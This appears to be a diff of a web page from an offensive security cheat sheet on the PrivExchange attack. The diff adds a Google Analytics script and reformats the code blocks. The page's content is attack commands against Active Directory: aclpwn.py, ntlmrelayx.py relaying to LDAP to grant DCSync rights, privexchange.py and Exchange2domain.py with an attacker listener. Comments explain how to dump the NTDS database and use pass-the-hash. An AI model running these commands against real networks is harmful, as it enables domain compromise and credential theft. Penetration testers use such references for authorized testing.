@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:53 CEST">
+<meta name="revised" content="2023-02-14T12:07:01 CET">
 <title>PrivExchange :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1833,9 +1862,7 @@
     
     
     
-    
-
-<h3 id="resources">Resources</h3>
+    <h3 id="resources">Resources</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/dirkjanm/PrivExchange
 https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
 https://chryzsh.github.io/exploiting-privexchange/
@@ -1843,9 +1870,8 @@ https://chryzsh.github.io/exploiting-privexchange/
 <span style="color:#75715e"># After exploitation, you won&#39;t be like Domain Admin directly, so, you won&#39;t be able to connect to the</span>
 <span style="color:#75715e"># DC using Domain Admins rights.</span>
 <span style="color:#75715e"># Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database</span>
-<span style="color:#75715e"># You can then use Pass the Hash attack with administrators accounts to get real access</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># You can then use Pass the Hash attack with administrators accounts to get real access</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="aclpwn">Aclpwn</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them</span>
 <span style="color:#75715e"># BloodHound need to be running</span>
@@ -1858,10 +1884,9 @@ python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -
 python aclpwn.py -f user@domain.com -ft user -d domain.com -u user -p password -sp password -du neo4j -dp password
 
 <span style="color:#75715e"># You can restore previous privileges after exploitation</span>
-python aclpwn.py -r restore-file</code></pre></div>
-<p><br/></p>
-
-<h3 id="ntlmrelayx-privexchange-py">ntlmrelayx / privexchange.py</h3>
+python aclpwn.py -r restore-file
+</code></pre></div><!-- raw HTML omitted -->
+<h3 id="ntlmrelayx--privexchangepy">ntlmrelayx / privexchange.py</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># NTLM relaying is used to relay connexion and give DCSync privileges</span>
 ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu
 
@@ -1871,15 +1896,15 @@ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u t
 
 <span style="color:#75715e"># You can also perform the attack without getting any credentials</span>
 <span style="color:#75715e"># Using the httpattack.py file</span>
-<span style="color:#75715e"># It uses NTLM Relaying with LLMNR / NBT-NS to relay captured credentials over the network</span></code></pre></div>
-<p><br/></p>
-
+<span style="color:#75715e"># It uses NTLM Relaying with LLMNR / NBT-NS to relay captured credentials over the network</span>
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="exchange2domain">Exchange2domain</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># All in One tools of privexchange</span>
 <span style="color:#75715e"># You only need to open the web server port, so no high privileges are required.</span>
 
 <span style="color:#75715e"># Many options available</span>
-python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip</code></pre></div>
+python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
+</code></pre></div>
 
     
     
